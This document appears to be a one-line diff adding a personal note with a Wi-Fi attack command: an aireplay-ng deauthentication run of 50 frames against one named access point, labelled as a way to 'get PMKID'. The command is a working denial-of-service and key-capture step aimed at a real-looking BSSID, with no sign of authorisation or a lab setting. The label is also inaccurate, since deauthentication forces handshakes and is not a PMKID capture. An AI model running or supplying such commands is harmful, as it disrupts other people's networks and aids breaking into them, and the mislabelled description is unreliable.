@@ -1,0 +1,1 @@
+To get PMKID: sudo aireplay-ng -0 50 -a D8:32:14:69:29:B8 wlan0
